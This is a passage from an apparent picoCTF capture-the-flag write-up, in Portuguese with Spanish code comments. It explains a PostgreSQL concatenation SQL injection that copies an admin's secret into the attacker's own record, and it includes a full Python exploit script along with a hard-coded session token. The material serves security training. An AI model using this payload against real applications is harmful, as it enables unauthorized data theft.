'': Cria uma string de texto vazia.

||: É o operador de concatenação no PostgreSQL (une textos).

(SELECT content FROM secrets LIMIT 1): É uma subconsulta que acessa diretamente a tabela, pega o primeiro segredo armazenado (que, por ordem de criação nos desafios do picoCTF, é sempre o do administrador) e o retorna imediatamente.

Em vez de danificar o banco de dados ou fazê-lo demorar, a consulta é executada com total normalidade e sucesso. O mecanismo do banco de dados une a string vazia com o flag do administrador e a armazena na coluna content da sua própria conta.

3. O Refletor Imediato
A segunda parte do script simplesmente faz um GET na página principal. Como o aplicativo web foi projetado para listar na tela todos os segredos associados à sua sessão (a lista de “My Secrets” que você me mostrou antes), o servidor web lê seu registro recém-criado, encontra o flag incorporado ali e o exibe claramente no HTML.

O script em Python só precisa usar uma expressão regular (picoCTF\{.*\}) para procurar o formato do flag dentro do texto da página e exibi-lo no console em menos de um segundo.

Traduzido com a versão gratuita do tradutor - DeepL.com

Script
```
import requests
import re

# --- CONFIGURACIÓN DEL RETO ---
# Ajusta la URL con el puerto activo de tu instancia actual de picoCTF
URL_BASE = "http://candy-mountain.picoctf.net:51728"

# Coloca aquí tu token de autenticación (el valor de la cookie auth_token)
COOKIES = {
    "auth_token": "ce8512fc-7a40-4ade-bc56-ae9806573b05"
}
# ------------------------------

url_create = f"{URL_BASE}/secrets/create"
url_dashboard = f"{URL_BASE}/"

# Payload de concatenación para PostgreSQL: inserta el secreto del admin en tu fila
payload = "'|| (SELECT content FROM secrets LIMIT 1) ||'"

data = {
    "content": payload
}

try:
    print("[*] Enviando payload malicioso al endpoint /secrets/create...")
    # Enviamos el POST para forzar la inserción asimétrica
    response = requests.post(url_create, data=data, cookies=COOKIES, allow_redirects=True)
    
    if response.status_code == 200 or response.history:
        print("[*] Petición enviada correctamente. Solicitando Dashboard para extraer los datos...")
        
        # Consultamos el Home para ver el reflejo de la base de datos
        dashboard_res = requests.get(url_dashboard, cookies=COOKIES)
        
        # Buscamos la estructura clásica de las flags de picoCTF en el cuerpo del HTML
        flag = re.findall(r"picoCTF\{.*?\}", dashboard_res.text)
        
        if flag:
            print("\n" + "="*40)
            print(f"[+] ¡Flag extraída con éxito!: {flag[0]}")
            print("="*40)
        else:
            print("\n[-] No se detectó ninguna flag con el formato picoCTF{...} en la respuesta.")
            print("[*] Tip: Verifica si la sesión de la cookie caducó o si la instancia cambió de puerto.")
    else:
        print(f"[-] El servidor respondió con un código de estado inesperado: {response.status_code}")

except requests.exceptions.RequestException as e:
    print(f"[-] Error en la conexión con el objetivo: {e}")
```
